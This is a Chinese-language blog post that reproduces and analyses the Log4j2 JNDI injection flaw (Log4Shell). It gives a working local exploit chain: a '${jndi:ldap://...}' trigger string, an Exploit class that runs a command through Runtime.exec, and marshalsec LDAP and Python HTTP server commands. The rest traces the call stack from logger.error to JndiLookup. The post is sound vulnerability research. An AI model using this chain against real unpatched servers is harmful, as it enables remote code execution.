---
title: Apache Log4j2复现分析
tags:
  - Java
  - Log4j
categories: 
  - Java
  - Log4j
  - RCE
description: Apache Log4j2复现分析
excerpt: Apache Log4j2复现分析
typora-root-url: Apache-Log4j2复现分析
abbrlink: 31499
date: 2021-12-13 21:10:05
---

# Apache Log4j2

### 0x00 简介

Apache Log4j2是一个开源的Java日志框架，在中间件、开发框架、Web应用、游戏中被广泛应用。

### 0x01 漏洞概述

Apache Log4j2某些功能存在递归解析，从而使得未经身份验证的攻击者可通过发送特定恶意数据包执行任意代码。

该漏洞影响范围：

Apache Log4j 2.x ~ 2.15.0-rc1

### 0x02 复现环境配置

创建一个Maven项目(或Gradle)，随后导入Log4j的依赖，附上本人的Pom.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>log4j2test</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
</project>
```

JDK版本：

```bash
$ java -version
java version "1.8.0_144"
Java(TM) SE Runtime Environment (build 1.8.0_144-b01)
Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)
```

由于JDK1.8.191以上以及默认不支持LDAP协议了，所以对于高版本的JDK需要一定的依赖(并非高版本的JDK就一定安全)。

使用JDK11.0.1、8u191、7u201、6u211以上版本在一定程度上可以阻止该漏洞，但并非绝对的。

复现代码：

```java
package com.test;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class main {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("error_mes:${jndi:ldap://localhost:8888/Exploit}");
    }
}
```

在上述代码中只简单地声明了静态Logger对象，并且在主函数内调用了logger的error方法，值得注意的是传入error方法的参数。

在进行分析之前，还需要进行进一步的准备。

### 0x03 JNDI LDAP Server

与FastJSON漏洞如出一辙，先写一个执行任意命令的Exploit类：

```java
class Exploit {
    static {
        try {
            String cmd = "calc";
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

将代码放入静态区，或者在构造函数内执行任意命令，都是可行的。

编译该代码：

```bash
javac Exploit.java
```

这将产生一个`Exploit.class`的文件，这个字节码文件将通过LDAP协议被传输到我们上面写的程序上，Java将使用`loadClass`动态加载该类，从而执行我们的恶意代码。

接下来需要用到一个RMI反序列化工具，受限克隆`marshalsec`源代码并进行编译，其地址为：`https://github.com/mbechler/marshalsec.git`，然后使用maven构建即可。

```bash
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
```

等待maven下载依赖并构建完成后，你应该可以在target中找到编译后的jar文件。

接下来我们使用该工具启动一个JNDI LDAP Server(target目录下)：

```powershell
Invoke-Java -Version "8u191" -ArgumentList "-cp",".\marshalsec-0.0.3-SNAPSHOT-all.jar","marshalsec.jndi.LDAPRefServer","http://127.0.0.1:8000/#Exploit","8888"
```

> 为了不同版本的Java调用方便，我特意写了一个Powershell脚本，如果你只有一个JDK，请参考正常调用。

正常调用：

```powershell
java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit" 8888
```

随后我们利用Python简单的启动一个HTTP Server，注意这个Server必须在Exlpoit.class文件的目录下启动：

```powershell
python -m http.server 8000
```

### 0x04 执行任意代码

让我们回到开始写的代码，现在尝试执行它，可以发现：

![image-20211213225804147](./image-20211213225804147.png)

成功地弹出了计算器，这说明我们的命令被执行了。

### 0x05 RCE分析

接下来开始分析一下，从logger.error到JndiLookup.lookup中间都发生了什么。

老样子，既然我们知道了最终的代码是在Runtime.exec执行的，那么我们现在这个地方下个断点：

![image-20211213231045481](./image-20211213231045481.png)

然后调试，可以获取到函数调用栈：

```java
exec:347, Runtime (java.lang)
<clinit>:5, Exploit
forName0:-1, Class (java.lang)
forName:348, Class (java.lang)
loadClass:72, VersionHelper12 (com.sun.naming.internal)
loadClass:87, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:8, main (com.test)
```

跟踪可以发现是一个典型的JNDI注入：

![image-20211213231938277](./image-20211213231938277.png)

随后从Main函数中常规的跟进，一直到：

![image-20211213233347378](./image-20211213233347378.png)

如果我们的日志中出现了`${`这样的标志，那么就会将我们的输入与前面的`时间 [函数] ERROR 包`分割，只留下我们error传入的参数，并且调用`this.config.getStrSubstitutor().replace(event, value)`，然后继续跟进replace方法。

可以看到在replace方法中又调用了substitute方法：

![image-20211213233848293](./image-20211213233848293.png)

跟进substitute函数，发现进行了递归调用，持续跟进，发现还是以美元符作为划分：

![image-20211213234523701](./image-20211213234523701.png)

并且这里看到了许多关键字，[data,java,marker,ctx,lower,upper,jndi,main,jvmrunargs,sys,env,log4j]，看起来很像是日志框架提供的内置函数或者变量。

再往下时，看到将大括号内的内容作为变量表达式了：

![image-20211213234747088](./image-20211213234747088.png)

根据发现调用了resolveVariable方法：

![image-20211213235624556](./image-20211213235624556.png)

该方法又调用了lookup：

![image-20211213235706835](./image-20211213235706835.png)

可以看到这里将jndi:切割掉，留下了的剩下的ldap://。

然后通过前缀，来判断是否能勾resolve，这也确定了前面那些关键字：

![image-20211213235850292](./image-20211213235850292.png)

接着再次调用lookup：

![image-20211214000524601](./image-20211214000524601.png)

分析到这里，其实就会发现这里就是非常常规的JNDI注入点了

### 0x06 总结

从上面的源代码分析可以发现其实这次漏洞造成的原因真的很简单，Log4j在解析变量模板时，简单的通过`:`去分割，然后再通过前缀来判断使用什么解析器去进行lookup从而引发了JNDI注入导致RCE，支持的前缀在前面也有提到(指不定这些也可以利用利用，未深入研究)。

另外，高版本的Java对JNDI注入其实有所防范，如果使用了高版本的JDK尝试复现，可能会显示

```bash
error_mes: foo
```

附上JDK 1.8.0_144下载链接：https://download.oracle.com/otn/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-windows-x64.exe?AuthParam=1639405637_45432aeb4b327e903f9348c058c94232

